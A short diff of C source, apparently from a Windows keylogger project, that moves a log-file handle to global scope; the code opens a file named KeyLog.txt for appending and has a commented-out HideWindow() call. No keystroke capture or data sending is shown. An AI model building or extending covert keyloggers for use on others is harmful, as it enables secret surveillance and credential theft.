@@ -1,10 +1,11 @@
 #include "winkey.h"
 
+FILE    *LogFile = NULL;
+
 int main(void)
 {
     // HideWindow();
 
-    FILE    *LogFile;
     errno_t err;
 
     err = fopen_s(&LogFile, "C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+");
